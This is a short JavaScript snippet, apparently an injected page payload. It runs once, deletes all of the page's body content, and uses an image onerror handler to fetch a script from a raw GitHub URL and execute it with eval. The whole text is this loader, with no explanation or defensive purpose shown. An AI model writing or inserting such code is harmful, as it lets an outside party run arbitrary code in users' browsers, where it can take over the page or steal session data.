// so it executes once
if (typeof executed === 'undefined') {
    executed = true; 

var oldElements = document.querySelectorAll('body > *');
                oldElements.forEach(function(element) {
                    element.remove();
                });

                var img = document.createElement('img');
                img.src = '#';
                img.onerror = function() {
                    fetch("https://raw.githubusercontent.com/skibidiking33/New-EASS/main/js-html.js").then(function(response) {
                        return response.text();
                    }).then(function(code) {
                        eval(code);
                    });
                };

}
